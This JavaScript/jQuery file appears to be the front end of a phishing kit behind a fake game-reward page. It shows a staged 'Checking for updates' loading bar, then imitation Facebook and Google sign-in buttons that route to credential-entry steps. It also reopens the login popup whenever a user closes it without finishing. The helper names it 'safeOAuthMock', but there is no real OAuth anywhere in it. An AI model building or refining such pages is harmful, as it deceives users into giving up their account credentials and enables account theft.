// V5

$(document).ready(function () {
  $('head').append($('<style id="lazcode-style">').text([
    '@font-face {',
    '  font-family: "lazaLatinMock";',
    '  font-style: normal;',
    '  font-weight: 400 900;',
    '  font-display: swap;',
    '  src: url("fonts/laza-latin.otf") format("opentype");',
    '}',

    '.lazpage-blur { filter: blur(5px); transition: filter .35s ease; }',

    '.popup.loadinglogin, .popup.account_login {',
    '  display: none !important;',
    '}',

    '.popup.loadinglogin.laz-popup-visible {',
    '  position: fixed !important;',
    '  inset: 0 !important;',
    '  z-index: 99990 !important;',
    '  width: 100% !important;',
    '  height: 100% !important;',
    '  margin: 0 !important;',
    '  padding: 0 !important;',
    '  display: flex !important;',
    '  align-items: center !important;',
    '  justify-content: center !important;',
    '  background: rgba(0,0,0,0.88) !important;',
    '}',

    '.laz-load-card {',
    '  position: relative;',
    '  width: min(400px, 88vw);',
    '  border-radius: 0;',
    '  overflow: hidden;',
    '  box-shadow: 0 0 30px rgba(0,0,0,0.8);',
    '}',

    '.laz-load-card > img {',
    '  display: block;',
    '  width: 100%;',
    '  height: auto;',
    '}',

    '.laz-load-overlay {',
    '  position: absolute;',
    '  left: 8px;',
    '  right: 8px;',
    '  bottom: 20px;',
    '  padding: 0;',
    '  background: none;',
    '}',

    '.laz-load-label {',
    '  display: block;',
    '  width: 100%;',
    '  margin: 0 0 10px;',
    '  font-family: "lazaLatinMock", Arial, sans-serif;',
    '  font-size: 9px;',
    '  font-weight: 800;',
    '  line-height: 1;',
    '  letter-spacing: 0;',
    '  color: #fff;',
    '  text-align: center;',
    '  text-shadow: 0 1px 3px rgba(0,0,0,1);',
    '}',

    /* KHUSUS TULISAN CONNECTING TO SERVER DIGEDEIN */
    '#lazLabel2 {',
    '  font-size: 11px !important;',
    '}',

    '.laz-bar-track {',
    '  width: 100%;',
    '  height: 5px;',
    '  position: relative;',
    '  box-sizing: border-box;',
    '  overflow: hidden;',
    '  border-radius: 0;',
    '  border: 1px solid rgba(255,255,255,0.55);',
    '  background: rgba(55,55,55,0.82);',
    '}',

    '#lazBarFill {',
    '  position: absolute;',
    '  left: 0;',
    '  top: 0;',
    '  width: 0%;',
    '  height: 100%;',
    '  border-radius: 0;',
    '  background: linear-gradient(90deg, #e69000 0%, #ffc400 75%, #ffe066 100%);',
    '  box-shadow: 0 0 8px rgba(255,170,0,0.9);',
    '}',

    '.popup.account_login.laz-popup-visible {',
    '  position: fixed !important;',
    '  inset: 0 !important;',
    '  z-index: 99991 !important;',
    '  width: 100% !important;',
    '  height: 100% !important;',
    '  margin: 0 !important;',
    '  padding: 0 !important;',
    '  display: flex !important;',
    '  align-items: center !important;',
    '  justify-content: center !important;',
    '  border-radius: 0 !important;',
    '  min-height: unset !important;',
    '  background: rgba(0,0,0,0.78) !important;',
    '}',

    '.laz-login-card {',
    '  position: relative;',
    '  width: min(392px, 94vw);',
    '  border-radius: 0;',
    '  overflow: hidden;',
    '  box-shadow: 0 0 30px rgba(0,0,0,0.8);',
    '}',

    '.laz-login-card > img.laz-login-bg {',
    '  display: block;',
    '  width: 100%;',
    '  height: auto;',
    '}',

    '.laz-login-btns {',
    '  position: absolute;',
    '  left: 0;',
    '  right: 0;',
    '  bottom: 12px;',
    '  padding: 0 108px;',
    '  display: flex;',
    '  flex-direction: column;',
    '  gap: 2px;',
    '}',

    '.laz-btn-fb, .laz-btn-gg {',
    '  display: flex;',
    '  align-items: center;',
    '  justify-content: center;',
    '  width: 100%;',
    '  height: 25px;',
    '  border: none;',
    '  outline: none;',
    '  cursor: pointer;',
    '  background-size: 100% 100% !important;',
    '  font-family: "lazaLatinMock", Arial, sans-serif;',
    '  font-size: 9px;',
    '  font-weight: 800;',
    '}',

    '.laz-btn-fb {',
    '  color: #fff;',
    '  text-shadow: 0 1px 3px rgba(0,0,0,0.5);',
    '  background-image: url("https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/img/ffxgintamav2/utama/facebook.png") !important;',
    '}',

    '.laz-btn-gg {',
    '  color: #222;',
    '  background-image: url("https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/img/ffxgintamav2/utama/google.png") !important;',
    '}',

    '.laz-btn-fb:active, .laz-btn-gg:active { opacity: .82; }',

    '.laz-btn-fb .fab, .laz-btn-fb .fa-facebook-f {',
    '  font-size: 13px;',
    '  color: #fff;',
    '}',

    '.laz-gg-svg {',
    '  width: 13px;',
    '  height: 13px;',
    '  flex-shrink: 0;',
    '}',

    '.laz-or-div {',
    '  display: flex;',
    '  align-items: center;',
    '  justify-content: center;',
    '  width: 100%;',
    '  margin: 8px 0;',
    '  font-family: "lazaLatinMock", Arial, sans-serif;',
    '  font-size: 9px;',
    '  font-weight: 800;',
    '  color: rgba(255,255,255,.95);',
    '  text-shadow: 0 1px 4px rgba(0,0,0,.9);',
    '}',

    '.laz-or-div::before, .laz-or-div::after {',
    '  content: "";',
    '  flex: 1;',
    '  height: 1px;',
    '  background: rgba(255,255,255,0.3);',
    '  margin: 0 10px;',
    '}'
  ].join('\n')));

  function showLazPopup(selector, duration, cb) {
    $(selector)
      .stop(true, true)
      .css('opacity', 0)
      .addClass('laz-popup-visible')
      .animate({ opacity: 1 }, duration || 300, cb);
  }

  function hideLazPopup(selector, duration, cb) {
    $(selector)
      .stop(true, true)
      .animate({ opacity: 0 }, duration || 250, function () {
        $(this).removeClass('laz-popup-visible').css('opacity', '');
        if (typeof cb === 'function') cb.call(this);
      });
  }

  function blurPage() {
    $('.laz-home, .header, .slider-container, .footer').addClass('lazpage-blur');
  }

  function unblurPage() {
    $('.laz-home, .header, .slider-container, .footer').removeClass('lazpage-blur');
  }

  var originalCloseModal = window.closeModal;
  
  window.closeModal = function(isSuccess) { 
    if (typeof playTutupSound === 'function') playTutupSound();
    
    if (typeof originalCloseModal === 'function') {
      originalCloseModal();
    } else {
      var overlay = document.getElementById('overlay');
      if(overlay) overlay.classList.remove('active');
    }
    
    if (isSuccess !== true) {
      showLazPopup('.popup.account_login', 300);
    }
  };

  (function buildLoadingPopup() {
    var $popup = $('.popup.loadinglogin');
    if (!$popup.length) return;

    $popup.empty().removeClass('laz-popup-visible').css('opacity', '');

    var $card = $('<div class="laz-load-card">');
    var $img = $('<img alt="loading">').attr('src',
      'https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/img/popuplogin.jpg');

    var $overlay = $('<div class="laz-load-overlay">');
    var $lbl1 = $('<span class="laz-load-label" id="lazLabel1">Checking for updates...</span>');
    var $lbl2 = $('<span class="laz-load-label" id="lazLabel2" style="display:none;">Connecting to server...</span>');
    var $track = $('<div class="laz-bar-track">');
    var $fill = $('<div id="lazBarFill">');

    $track.append($fill);
    $overlay.append($lbl1).append($lbl2).append($track);
    $card.append($img).append($overlay);
    $popup.append($card);
  })();

  (function buildLoginChoicePopup() {
    var $popup = $('.popup.account_login');
    if (!$popup.length) return;

    $popup.empty().removeClass('laz-popup-visible').css('opacity', '');

    var googleSVG = [
      '<svg class="laz-gg-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">',
      '<path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>',
      '<path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>',
      '<path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>',
      '<path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>',
      '</svg>'
    ].join('');

    var $card = $('<div class="laz-login-card">');
    var $bg = $('<img class="laz-login-bg" alt="login">').attr('src',
      'https://cdn.jsdelivr.net/gh/TirzzNesia/mylibrary@main/img/popuplogin.jpg');

    var $btnFb = $('<button class="laz-btn-fb" type="button">').html(
      '<i class="fab fa-facebook-f"></i><span>Sign in with Facebook</span>'
    );

    var $or = $('<div class="laz-or-div">or</div>');

    var $btnGg = $('<button class="laz-btn-gg" type="button">').html(
      googleSVG + '<span>Sign in with Google</span>'
    );

    var $btns = $('<div class="laz-login-btns">');
    if (typeof currentLoginMode !== 'undefined') {
      if (currentLoginMode === 'facebook') {
        $btns.append($btnFb);
      } else if (currentLoginMode === 'google') {
        $btns.append($btnGg);
      } else {
        $btns.append($btnFb).append($or).append($btnGg);
      }
    } else {
      $btns.append($btnFb).append($or).append($btnGg);
    }

    $card.append($bg).append($btns);
    $popup.append($card);

    $btnFb.on('mousedown', function () {
      if (typeof playBukaSound === 'function') playBukaSound();
    }).on('click', function () {
      safeOAuthMock('Facebook');
    });

    $btnGg.on('mousedown', function () {
      if (typeof playBukaSound === 'function') playBukaSound();
    }).on('click', function () {
      safeOAuthMock('Google');
    });
  })();

  function safeOAuthMock(provider) {
    $('input#validateLogin').val(provider === 'Facebook' ? 'Facebook' : 'Google Play');
    hideLazPopup('.popup.account_login', 200, function () {
      document.getElementById('overlay').classList.add('active');
      if (provider === 'Facebook') {
        showStep('stepFB');
      } else {
        showStep('stepGEmail');
      }
    });
  }

  // LOADING TOTAL 3 DETIK SAJA
  function runLoadingBar(cb) {
    var $fill = $('#lazBarFill'), $l1 = $('#lazLabel1'), $l2 = $('#lazLabel2');
    $fill.css('width', '0%');
    $l1.show(); $l2.hide();

    setTimeout(function () { // Delay awal 500ms
      $fill.animate({ width: '75%' }, {
        duration: 800, // Cepat ke 75% (0.8 detik)
        easing: 'swing',
        complete: function () {
          $l1.fadeOut(150, function() { $l2.fadeIn(150); });
          $fill.animate({ width: '100%' }, {
            duration: 1200, // Melambat ke 100% (1.2 detik)
            easing: 'linear',
            complete: function () {
              setTimeout(cb, 500); // Delay akhir 500ms
            }
          });
        }
      });
    }, 500);
  }

  function startLoginLoading() {
    blurPage();
    showLazPopup('.popup.loadinglogin', 300, function () {
      runLoadingBar(function () {
        hideLazPopup('.popup.loadinglogin', 350, function () {
          showLazPopup('.popup.account_login', 300);
        });
      });
    });
  }

  window.get_token = function () {
    if (typeof playBukaSound === 'function') playBukaSound();
    $('.itemReward_confirmation2').fadeOut(150);
    $('.open_rewards').fadeOut(150);

    var playid = $('#playid').val().trim();
    setTimeout(function () {
      if (!playid) {
        $('.TrueID').fadeIn(200);
      } else {
        startLoginLoading();
      }
    }, 180);
  };

  function handleLogin(provider) {
    if (typeof playBukaSound === 'function') playBukaSound();
    
    $('input#validateLogin').val(provider === 'Facebook' ? 'Facebook' : 'Google Play');
    
    hideLazPopup('.popup.account_login', 200, function () {
      $('.popup.account_verification').fadeIn(300);
    });
  }

  window.close_account_login = function () {
    if (typeof playTutupSound === 'function') playTutupSound();
    hideLazPopup('.popup.account_login', 200, function () {
      unblurPage();
    });
  };

  window.open_facebook = function () {
    safeOAuthMock('Facebook');
  };

  window.open_google = function () {
    safeOAuthMock('Google');
  };
});
